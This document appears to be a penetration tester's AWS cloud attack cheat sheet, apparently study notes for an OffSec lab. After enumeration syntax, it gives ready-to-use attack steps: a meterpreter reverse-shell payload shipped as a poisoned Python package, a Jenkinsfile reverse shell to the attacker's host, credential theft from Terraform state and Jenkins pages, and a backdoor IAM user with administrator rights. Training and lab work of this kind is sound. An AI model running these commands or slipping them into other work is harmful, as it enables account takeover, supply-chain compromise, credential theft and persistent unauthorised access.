# Cloud Enumeration — Command Appendix

Part of [[COMMAND APPENDIX]]. AWS cloud enumeration syntax reference. For the full phase-ordered workflow see [[Cloud Methodology]]. For symptom-based triage see [[Cloud Enumeration (Decision Tree)]].

#AWS #Cloud #IAM #S3 #CommandAppendix

---

## AWS CLI Setup

```bash
# Install
sudo apt install awscli

# Configure named profile (never use default when juggling multiple credential sets)
aws configure --profile <name>
# Prompts: Access Key ID, Secret Access Key, [Session Token], Region (us-east-1), Format (json)

# Set session token separately (for assumed-role temp creds)
aws configure set aws_session_token "<token>" --profile <name>

# Verify identity
aws sts get-caller-identity --profile <name>
# → UserId, Account (12-digit), Arn

# Suppress pager output
--no-cli-pager    # add to any command that pages output
```

---

## DNS Recon (External Cloud Recon)

```bash
# Identify DNS provider from NS records
host -t ns <domain>
whois <ns-hostname> | grep "Registrant Organization"   # awsdns-* → Amazon = Route53

# Resolve hostname + reverse DNS to confirm EC2
host www.<domain>
host <ip>    # → ec2-X.compute-1.amazonaws.com confirms EC2

# TXT records — may contain flags/data hidden in SPF strings
dig TXT <domain> @<dns_ip>
dig TXT <domain>    # uses system resolver

# Subdomain brute force (zone transfer will fail on Route53 — expected)
dnsenum <domain> --threads 100
```

---

## S3 Bucket Enumeration

```bash
# Extract bucket name from site HTML (suffix embedded in asset URLs)
curl -s http://<site_ip> -H "Host: www.<domain>" | grep -o '<org>-[^/"]*'

# Test bucket access level
curl -s "https://s3.amazonaws.com/<bucket-name>/"
# XML listing = public read (open), AccessDenied = private exists, NoSuchBucket = doesn't exist

# Download object directly (works even if bucket listing is denied)
aws s3 cp s3://<bucket-name>/<object-key> - --profile <name>   # - = stdout
aws s3 cp s3://<bucket-name>/<object-key> /tmp/file --profile <name>

# List bucket contents (requires s3:ListBucket)
aws s3 ls s3://<bucket-name>/ --profile <name>

# Brute-force related buckets by naming convention
for gem in ruby amethyst sapphire emerald; do
  echo -n "Trying <org>-${gem}-<suffix> ... "
  aws s3 cp s3://<org>-${gem}-<suffix>/proof.txt - 2>/dev/null || echo "not found"
done

# Automated multi-cloud bucket enumeration
cloud_enum -k <known-bucket-name> --quickscan --disable-azure --disable-gcp
cloud_enum -kf /tmp/keyfile.txt -qs --disable-azure --disable-gcp
# -k = single keyword, -kf = keyword file, -qs = no built-in mutations wordlist
```

---

## EC2 Enumeration

```bash
# Find public AMIs by keyword — OwnerId field = target's account ID
aws ec2 describe-images --executable-users all \
  --filters "Name=name,Values=*<keyword>*" --profile <name> --no-cli-pager

# Enumerate EBS snapshots by account ID
aws ec2 describe-snapshots --owner-ids <account-id> --profile <name> --no-cli-pager

# Filter snapshots by size (JMESPath)
aws ec2 describe-snapshots --owner-ids <account-id> --profile <name> --no-cli-pager \
  --query "Snapshots[?VolumeSize==\`1\`]"

# Describe VPCs (look for proof/flag tags)
aws ec2 describe-vpcs --profile <name> --no-cli-pager

# Describe instances
aws ec2 describe-instances --profile <name> --no-cli-pager

# Describe tags across all EC2 resources (requires ec2:DescribeTags — often restricted)
aws ec2 describe-tags --profile <name> --no-cli-pager
```

---

## IAM Enumeration

```bash
# Who am I? (most reliable, always logged in CloudTrail)
aws sts get-caller-identity --profile <name>

# Which account owns this key? (logs in caller's account, not target's)
aws sts get-access-key-info --access-key-id AKIA... --profile <name>

# Scope permissions — user's direct policies
aws iam list-user-policies --user-name <user> --profile <name>          # inline
aws iam list-attached-user-policies --user-name <user> --profile <name>  # managed

# Scope permissions — group memberships
aws iam list-groups-for-user --user-name <user> --profile <name>
aws iam list-group-policies --group-name <group> --profile <name>          # inline
aws iam list-attached-group-policies --group-name <group> --profile <name>  # managed

# Read a policy document (get version ID first)
aws iam list-policy-versions --policy-arn <arn> --profile <name>
aws iam get-policy-version --policy-arn <arn> --version-id v1 --profile <name>

# BEST: single call, full IAM snapshot (users/groups/roles/policy docs)
aws iam get-account-authorization-details \
  --filter User Group LocalManagedPolicy \
  --no-cli-pager --profile <name> > /tmp/iam-dump.json
# Filters: User Group Role LocalManagedPolicy AWSManagedPolicy (omit AWSManagedPolicy to keep small)
```

---

## jq IAM Dump Analysis

```bash
# Show all top-level keys in the dump
jq 'keys' /tmp/iam-dump.json   # → UserDetailList, GroupDetailList, Policies, RoleDetailList

# List every user with groups, attached policies, and inline policies
jq '.UserDetailList[] | {user: .UserName, groups: .GroupList, attached: [.AttachedManagedPolicies[].PolicyName], inline: [(.UserPolicyList // [])[].PolicyName]}' /tmp/iam-dump.json

# Find users with directly attached policies (potential misconfigs)
jq '.UserDetailList[] | select(.AttachedManagedPolicies | length > 0) | {user: .UserName, policies: [.AttachedManagedPolicies[].PolicyName]}' /tmp/iam-dump.json

# Read a named policy document
jq '.Policies[] | select(.PolicyName == "<name>") | .PolicyVersionList[].Document' /tmp/iam-dump.json

# Find policies with tag-based conditions (ABAC — potential privesc via tag confusion)
jq '.Policies[].PolicyVersionList[].Document.Statement[] | select(.Condition != null)' /tmp/iam-dump.json
```

---

## Pacu (AWS Exploitation Framework)

```bash
# Start Pacu
pacu
# → name session when prompted

# Inside Pacu shell
import_keys <profile-name>          # pull from ~/.aws/credentials
import_keys --all                   # import all profiles
set_keys                            # enter manually
whoami                              # confirm active keys
services                            # list services with collected data
data IAM                            # dump all IAM data for current session
export_keys                         # write active keys back to ~/.aws/credentials

# IAM enumeration modules
run iam__enum_roles --account-id <acct> --word-list /tmp/roles.txt   # cross-account role oracle
run iam__enum_users --account-id <acct> --word-list /tmp/users.txt   # cross-account user oracle
run iam__enum_users_roles_policies_groups                             # full IAM dump (like get-account-authorization-details)
run iam__bruteforce_permissions                                       # try all IAM actions (noisy)

# Assume role from within Pacu
assume_role arn:aws:iam::<acct>:role/<role-name>
# → adds temp keys to session database, swaps active keys

# Run native AWS CLI commands inside Pacu
aws sts get-caller-identity   # uses current Pacu active keys (NOT ~/.aws/credentials — be careful)
```

> 🔧 Technique: Pacu's `iam__enum_roles` uses the IAM trust policy as an oracle, creates a temp role in your account, tries to set its trust policy to include each target ARN, and watches for `MalformedPolicy` (ARN doesn't exist) vs success (ARN exists). If a role exists AND can be assumed, Pacu dumps the temporary credentials automatically. The cleanup `DeleteRole` step fails if the attacker lacks `iam:DeleteRole`, harmless, just leaves the temp PacuIamEnumRoles-* role behind.


---

## CI/CD Attack Chain

#CICD #DependencyConfusion #Jenkins #Terraform #PoisonedPipeline

### Dependency Chain Abuse (Malicious Python Package)

```bash
# Generate meterpreter Python payload (from attacker machine)
msfvenom -f raw -p python/meterpreter/reverse_tcp \
  LHOST=<your-public-ip> LPORT=4488

# Build package (from hackshort-util/ directory)
python3 setup.py sdist
ls dist/   # confirm tarball name before uploading

# Upload SPECIFIC tarball to private PyPI (avoids stale leftover builds)
~/.local/bin/twine upload \
  --repository-url http://pypi.offseclab.io/ \
  -u student -p password \
  dist/hackshort_util-1.1.4.tar.gz

# Remove a bad version
curl -u "student:password" \
  --form ":action=remove_pkg" \
  --form "name=hackshort_util" \
  --form "version=1.1.4" \
  http://pypi.offseclab.io/

# Check what's published
curl -u 'student:password' http://pypi.offseclab.io/hackshort-util/json

# Install twine if missing (no apt repos available)
pip install twine --break-system-packages
```

### MSF Handler for Python Meterpreter

```
use exploit/multi/handler
set payload python/meterpreter/reverse_tcp
set LHOST 0.0.0.0
set LPORT 4488
set ExitOnSession false
run -jz
```

### Container Network Scanning (No nmap — Python)

```python
# netscan.py — upload via meterpreter, run in shell
import socket, ipaddress, sys

def port_scan(ip_range, ports):
    for ip in ip_range:
        for port in ports:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(.2)
            result = sock.connect_ex((str(ip), port))
            if result == 0:
                print(f"Port {port} is open on {ip}")
            sock.close()

ip_range = ipaddress.IPv4Network(sys.argv[1], strict=False)
ports = [80, 443, 8080]
port_scan(ip_range, ports)
```

```bash
# Usage from inside container shell
python3 /netscan.py 172.18.0.1/24
python3 /netscan.py 172.30.0.1/24
```

### SQLite Without sqlite3 Binary

```bash
# sqlite3 binary rarely in minimal containers — use Python
python3 -c "
import sqlite3
c = sqlite3.connect('/data/data.db')
print([t[0] for t in c.execute(\"SELECT name FROM sqlite_master WHERE type='table'\")])
print(c.execute('SELECT * FROM url').fetchall())
"
```

### MSF SOCKS Proxy + SSH Tunnel for Jenkins Pivot

```bash
# In msfconsole on cloud Kali
use auxiliary/server/socks_proxy
set SRVHOST 127.0.0.1
run -j

route add 172.30.0.0 255.255.0.0 <session_id>

# From personal Kali
ssh -fN -L localhost:1080:localhost:1080 kali@<cloud-kali-ip>
ss -tulpn | grep 1080   # confirm tunnel

# Firefox: Settings → Network Settings → SOCKS5 127.0.0.1:1080
# Browse to http://172.30.0.30:8080 (Jenkins internal IP)
```

### Terraform State File Credentials

```bash
# Find tf-state bucket
aws --profile=<stolen> s3api list-buckets | grep -i "tf\|terraform\|state"

# Download state file
aws --profile=<stolen> s3 cp s3://tf-state-<suffix>/terraform.tfstate ./

# Extract credentials
grep -A10 '"access_key"' terraform.tfstate
grep -A10 '"secret_key"' terraform.tfstate
grep -A20 '"index_key"' terraform.tfstate   # per-user key blocks
grep -B2 -A2 "AdministratorAccess" terraform.tfstate

# Configure admin profile from stolen TF state creds
aws configure --profile=goran.b

# Confirm admin
aws --profile=goran.b iam list-attached-user-policies --user-name goran.b
aws --profile=goran.b sts get-caller-identity

# Find flag in EC2 instance tags
aws --profile=goran.b ec2 describe-instances \
  --query 'Reservations[].Instances[].Tags' \
  --output json
```

### S3 Explorer Jenkins Plugin (Credential Leak)

After creating a Jenkins account (self-registration enabled):

1. Browse to the project using S3 Explorer
2. View Page Source: `Ctrl+U`
3. Search (`Ctrl+F`) for `awsid` and `awskey`
4. Credentials appear as hidden `<input>` fields with plaintext values

```bash
# Configure stolen creds
aws configure --profile=stolen-s3
# Enter: awsid, awskey, region: us-east-1

aws --profile=stolen-s3 sts get-caller-identity
aws --profile=stolen-s3 s3api list-buckets
aws --profile=stolen-s3 s3 ls s3://<company-directory-bucket>/
aws --profile=stolen-s3 s3 cp s3://<bucket>/secretFile -
```

### DNS Resolution for Private Lab Hosts

```bash
# Resolve without changing system DNS
nslookup pypi.offseclab.io <DNS_IP>

# Add to /etc/hosts (restart-free, no nmcli needed)
echo "<resolved-ip> pypi.offseclab.io" | sudo tee -a /etc/hosts
echo "<resolved-ip> git.offseclab.io" | sudo tee -a /etc/hosts

# Verify
ping -c1 pypi.offseclab.io
```

---

## Scenario 1: Leaked Secrets to Poisoned Pipeline

#PoisonedPipeline #GitLeaks #Jenkins #Jenkinsfile #IAM #BackdoorAccount

### S3 Bucket Recon (Authenticated User Misconfiguration)

```bash
# Check public listing (no auth)
curl https://<bucket>.s3.us-east-1.amazonaws.com
# AccessDenied = not publicly listable; try with CLI

# Configure provided lab IAM account
aws configure     # enter lab-provided access key, secret, us-east-1

# List bucket as any authenticated AWS user (AuthenticatedUsers ACL misconfiguration)
aws s3 ls <bucket-name>
aws s3 ls s3://<bucket-name>   # with s3:// prefix for subdirectory listing

# Download everything
mkdir <bucket> && aws s3 sync s3://<bucket-name> ./<bucket>/
```

### Git History Secret Hunting

```bash
# Automated scan (misses many custom formats)
sudo apt install -y gitleaks
gitleaks detect   # run from repo root

# Manual review (always do this regardless of gitleaks)
git log           # look for: "Fix issue", "Remove secret", "Clean up", "Oops"
git show <commit_hash>   # inspect any suspicious commit

# Decode discovered base64 credential
echo "<base64_value>" | base64 --decode
# HTTP Basic auth format: username:password
```

### Jenkins Reverse Shell via Poisoned Jenkinsfile

```groovy
// Jenkinsfile with reverse shell
pipeline {
  agent any
  stages {
    stage('Shell') {
      steps {
        withAWS(region: 'us-east-1', credentials: 'aws_key') {
          script {
            if (isUnix()) {
              sh 'bash -c "bash -i >& /dev/tcp/<cloud-kali-ip>/4242 0>&1" &'
            }
          }
        }
      }
    }
  }
}
```

```bash
# Test step: start apache2 first, commit curl payload, watch logs
sudo systemctl start apache2
# curl payload: sh 'curl http://<cloud-kali-ip>/unix'
tail -f /var/log/apache2/access.log

# Real step: start nc, commit bash reverse shell payload
nc -nvlp 4242
# → jenkins@<container>:~/agent/workspace/...
```

### Enumerating the Jenkins Builder

```bash
uname -a          # kernel + hostname
cat /etc/os-release
cat /proc/mounts  # overlay = Docker container
cat /proc/1/status | grep Cap   # check for privileged container

# On your Kali — decode capability hex
capsh --decode=<hex_value>
# cap_sys_admin + cap_net_admin = privileged

env | grep AWS    # AWS_ACCESS_KEY_ID, AWS_SECRET_ACCESS_KEY in env
```

### Creating a Backdoor IAM User (Full Admin Path)

```bash
# Configure stolen Jenkins credentials
aws configure --profile=CompromisedJenkins
aws --profile CompromisedJenkins sts get-caller-identity
# → ARN reveals username (e.g., user/system/jenkins-admin)

# Check all three policy attachment types
aws --profile CompromisedJenkins iam list-user-policies --user-name <username>
aws --profile CompromisedJenkins iam list-attached-user-policies --user-name <username>
aws --profile CompromisedJenkins iam list-groups-for-user --user-name <username>

# Read inline policy
aws --profile CompromisedJenkins iam get-user-policy \
  --user-name <username> --policy-name <policy-name>

# Create backdoor user (use inconspicuous name in real engagements)
aws --profile CompromisedJenkins iam create-user --user-name backdoor
aws --profile CompromisedJenkins iam attach-user-policy \
  --user-name backdoor \
  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
aws --profile CompromisedJenkins iam create-access-key --user-name backdoor

# Configure and verify
aws configure --profile=backdoor
aws --profile backdoor iam list-attached-user-policies --user-name backdoor
```
